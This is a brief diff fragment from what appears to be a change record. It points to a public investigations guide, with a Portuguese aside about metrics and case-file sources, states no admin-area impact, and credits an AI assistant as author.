+**Public Docs:** `docs/guide/investigations.md` (métricas como propriedade; fonte de
+arquivo legível por quem lê o caso).
+**Admin-Area Impact:** No admin-area impact.
+
+**Author:** Claude (AI Assistant)
